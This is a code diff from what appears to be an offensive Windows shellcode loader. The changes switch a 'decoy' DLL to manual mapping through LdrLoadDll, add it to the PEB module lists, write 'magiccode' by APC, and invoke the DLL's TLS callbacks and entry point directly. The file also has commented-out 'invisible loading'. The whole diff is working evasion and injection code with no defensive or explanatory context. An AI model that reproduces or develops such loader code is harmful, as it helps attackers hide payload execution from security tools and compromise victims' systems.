@@ -1437,7 +1437,7 @@ int main(int argc, char *argv[])
 
         UNICODE_STRING UnicodeDllPath;
         ManualInitUnicodeString(&UnicodeDllPath, dllPath);
-        NTSTATUS status = LdrLoadDll(NULL, 0, &UnicodeDllPath, &fileBase);
+        NTSTATUS status = LdrLoadDll(NULL, 0, &UnicodeDllPath, &fileBase);  // Load the DLL
 
         if (NT_SUCCESS(status)) {
             printf("[!] LdrLoadDll loaded successfully.\n");
@@ -1487,28 +1487,28 @@ int main(int argc, char *argv[])
     SIZE_T dllSize = ntHeader->OptionalHeader.SizeOfImage;
 
     // Load the DLL to get its base address in current process
-    // HMODULE hDll = LoadLibraryW(dllPath);
-    HMODULE hDll = dynamic::loadFuture(dllPath);
+    // HMODULE hDll = LoadLibraryW(dllPath); //Normal loading
+    // HMODULE hDll = dynamic::loadFuture(dllPath); //invisible loading
 
-    if (hDll == NULL) {
-        printf("Failed to load DLL. Error: %lu\n", GetLastError());
-        if(bUseLdrLoadDll) {
-            UnmapViewOfFile(fileBase);
-        } else {
-            UnmapViewOfFile(fileHandle);
-            UnmapViewOfFile(fileBase);
-            CloseHandle(hSection);
-        }
-        return 1;
-    } else { 
-		printf("[+] DLL loaded.\n");
-	}
+    // if (hDll == NULL) {
+    //     printf("Failed to load DLL. Error: %lu\n", GetLastError());
+    //     if(bUseLdrLoadDll) {
+    //         UnmapViewOfFile(fileBase);
+    //     } else {
+    //         UnmapViewOfFile(fileHandle);
+    //         UnmapViewOfFile(fileBase);
+    //         CloseHandle(hSection);
+    //     }
+    //     return 1;
+    // } else { 
+	// 	printf("[+] DLL loaded.\n");
+	// }
 
     // Calculate the AddressOfEntryPoint in current process
     // LPVOID dllEntryPoint = (LPVOID)(entryPointRVA + (DWORD_PTR)hDll);
 	// printf("[+] DLL entry point: %p\n", dllEntryPoint);
     
-    PVOID dllEntryPoint = (PVOID)(entryPointRVA + (DWORD_PTR)hDll);
+    PVOID dllEntryPoint = (PVOID)(entryPointRVA + (DWORD_PTR)fileBase);
 	// printf("[+] DLL entry point: %p\n", dllEntryPoint);
     wprintf(L"DLL %ls added to PEB lists\n", dllPath);
 
@@ -1612,7 +1612,7 @@ int main(int argc, char *argv[])
 
     if (result) {
         printf("Failed to APC write magiccode. Error: %lu\n", GetLastError());
-        FreeLibrary(hDll);
+        // FreeLibrary(hDll);
         // CloseHandle(hSection);
         UnmapViewOfFile(fileBase);
         // CloseHandle(fileMapping);
@@ -1642,24 +1642,24 @@ int main(int argc, char *argv[])
     }
 
 
-    PIMAGE_DOS_HEADER dosHeader1 = (PIMAGE_DOS_HEADER)hDll;
-    PIMAGE_NT_HEADERS ntHeader1 = (PIMAGE_NT_HEADERS)((DWORD_PTR)hDll + dosHeader1->e_lfanew);
+    PIMAGE_DOS_HEADER dosHeader1 = (PIMAGE_DOS_HEADER)fileBase;
+    PIMAGE_NT_HEADERS ntHeader1 = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader1->e_lfanew);
     DWORD entryPointRVA1 = ntHeader1->OptionalHeader.AddressOfEntryPoint;
     // //Write to .text section
-    PVOID dllEntryPoint1 = (PVOID)(entryPointRVA1 + (DWORD_PTR)hDll);
+    PVOID dllEntryPoint1 = (PVOID)(entryPointRVA1 + (DWORD_PTR)fileBase);
 
     PIMAGE_TLS_CALLBACK *callback_decoy;
     PIMAGE_DATA_DIRECTORY tls_entry_decoy = &ntHeader1->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
 
     if(tls_entry_decoy->Size) {
-        PIMAGE_TLS_DIRECTORY tls_dir_decoy = (PIMAGE_TLS_DIRECTORY)((unsigned long long int)hDll + tls_entry_decoy->VirtualAddress);
+        PIMAGE_TLS_DIRECTORY tls_dir_decoy = (PIMAGE_TLS_DIRECTORY)((unsigned long long int)fileBase + tls_entry_decoy->VirtualAddress);
         callback_decoy = (PIMAGE_TLS_CALLBACK *)(tls_dir_decoy->AddressOfCallBacks);
         for(; *callback_decoy; callback_decoy++)
-            (*callback_decoy)((LPVOID)hDll, DLL_PROCESS_ATTACH, NULL);
+            (*callback_decoy)((LPVOID)fileBase, DLL_PROCESS_ATTACH, NULL);
     }
     // Use function pointer to call the DLL entry point 2nd time.
-    DLLEntry DllEntry1 = (DLLEntry)((unsigned long long int)hDll + entryPointRVA1);
-    (*DllEntry1)((HINSTANCE)hDll, DLL_PROCESS_ATTACH, 0);
+    DLLEntry DllEntry1 = (DLLEntry)((unsigned long long int)fileBase + entryPointRVA1);
+    (*DllEntry1)((HINSTANCE)fileBase, DLL_PROCESS_ATTACH, 0);
 
     // CloseHandle(hThread);
     // FreeLibrary(hDll);
